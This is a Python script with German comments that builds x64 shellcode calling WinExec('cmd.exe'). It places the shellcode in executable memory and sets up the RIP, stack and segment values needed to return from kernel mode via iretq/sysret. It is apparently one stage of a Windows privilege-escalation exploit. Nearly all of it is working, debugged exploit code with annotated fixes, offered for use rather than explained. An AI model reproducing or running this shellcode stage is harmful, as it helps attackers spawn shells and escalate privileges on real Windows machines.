"""
WinExec Shellcode Setup — User-Mode Return via Trampoline Code
Ruft WinExec("cmd.exe", SW_SHOW) auf, um ein neues Fenster zu öffnen (Deadlock-frei).
"""

import ctypes
import struct

kernel32 = ctypes.windll.kernel32

# ── Konstanten ──────────────────────────────────────────────
MEM_COMMIT  = 0x1000
MEM_RESERVE = 0x2000
PAGE_EXECUTE_READWRITE = 0x40

# ── [FIX 1] restype für VirtualAlloc setzen ─────────────────
# Ohne dies wird der Rückgabewert auf 32-Bit abgeschnitten,
# was auf x64 zu falschen Pointer-Werten führt.
kernel32.VirtualAlloc.restype  = ctypes.c_void_p
kernel32.VirtualAlloc.argtypes = [
    ctypes.c_void_p,   # lpAddress
    ctypes.c_size_t,   # dwSize
    ctypes.c_uint32,   # flAllocationType
    ctypes.c_uint32,   # flProtect
]

# ==========================================================
# 1. "cmd.exe" String in ausführbaren Speicher schreiben
# ==========================================================
cmd_str = b"cmd.exe\x00"
cmd_str_addr = kernel32.VirtualAlloc(0, len(cmd_str),
                                     MEM_COMMIT | MEM_RESERVE,
                                     PAGE_EXECUTE_READWRITE)
if not cmd_str_addr:
    raise RuntimeError("VirtualAlloc für cmd_str fehlgeschlagen")
ctypes.memmove(cmd_str_addr, cmd_str, len(cmd_str))

# ==========================================================
# 2. WinExec-Funktionsadresse ermitteln
# ==========================================================
# [FIX 3] GetProcAddress statt ctypes.cast verwenden — robuster
kernel32.GetProcAddress.restype  = ctypes.c_void_p
kernel32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
WinExec_addr = kernel32.GetProcAddress(kernel32._handle, b"WinExec")
if not WinExec_addr:
    raise RuntimeError("GetProcAddress für WinExec fehlgeschlagen")

# ==========================================================
# 3. User-Mode Shellcode (Trampoline Code)
# ==========================================================
# WinExec("cmd.exe", SW_SHOW);
#
#   mov rcx, cmd_str_addr      ; Arg 1: Zeiger auf "cmd.exe"
#   mov rdx, 5                 ; Arg 2: SW_SHOW = 5
#   mov rax, WinExec_addr      ; Ziel-Funktion
#   sub rsp, 0x20              ; Shadow-Space (32 Bytes) — Alignment bleibt
#   call rax                   ; WinExec aufrufen
#   add rsp, 0x20              ; Stack wiederherstellen
#   jmp $                      ; Endlosschleife (Prozess am Leben halten)
#
# [FIX 2] sub/add rsp von 0x28 → 0x20 geändert:
#   Der Shellcode wird per iretq/sysret betreten (kein call),
#   daher ist RSP zu Beginn 16-Byte-aligned.
#   0x28 (40) würde das Alignment brechen; 0x20 (32) behält es bei.

user_stub = (
    b"\x48\xB9" + struct.pack('<Q', cmd_str_addr)       # mov rcx, cmd_str_addr
    + b"\x48\xC7\xC2\x05\x00\x00\x00"                  # mov rdx, 5  (SW_SHOW)
    + b"\x48\xB8" + struct.pack('<Q', WinExec_addr)     # mov rax, WinExec_addr
    + b"\x48\x83\xEC\x20"                               # sub rsp, 0x20
    + b"\xFF\xD0"                                        # call rax
    + b"\x48\x83\xC4\x20"                               # add rsp, 0x20
    + b"\xEB\xFE"                                        # jmp $ (Endlosschleife)
)

# Shellcode in ausführbaren Speicher schreiben
user_stub_addr = kernel32.VirtualAlloc(0, len(user_stub),
                                       MEM_COMMIT | MEM_RESERVE,
                                       PAGE_EXECUTE_READWRITE)
if not user_stub_addr:
    raise RuntimeError("VirtualAlloc für user_stub fehlgeschlagen")
ctypes.memmove(user_stub_addr, user_stub, len(user_stub))

# ==========================================================
# 4. Rücksprungadresse (RIP) und User-Stack setzen
# ==========================================================
user_rip = user_stub_addr

user_stack_base = kernel32.VirtualAlloc(0, 0x10000,
                                        MEM_COMMIT | MEM_RESERVE,
                                        PAGE_EXECUTE_READWRITE)
if not user_stack_base:
    raise RuntimeError("VirtualAlloc für user_stack fehlgeschlagen")

user_sp     = user_stack_base + 0x10000 - 0x100
user_cs     = 0x33
user_ss     = 0x2b
user_rflags = 0x246

# ==========================================================
# Zusammenfassung ausgeben
# ==========================================================
print(f"[+] cmd.exe String  @ {hex(cmd_str_addr)}")
print(f"[+] WinExec Adresse @ {hex(WinExec_addr)}")
print(f"[+] Shellcode Größe : {len(user_stub)} Bytes")
print(f"[+] Return User RIP (WinExec): {hex(user_rip)}")
print(f"[+] User Stack SP   : {hex(user_sp)}")
print(f"[+] CS={hex(user_cs)}  SS={hex(user_ss)}  RFLAGS={hex(user_rflags)}")
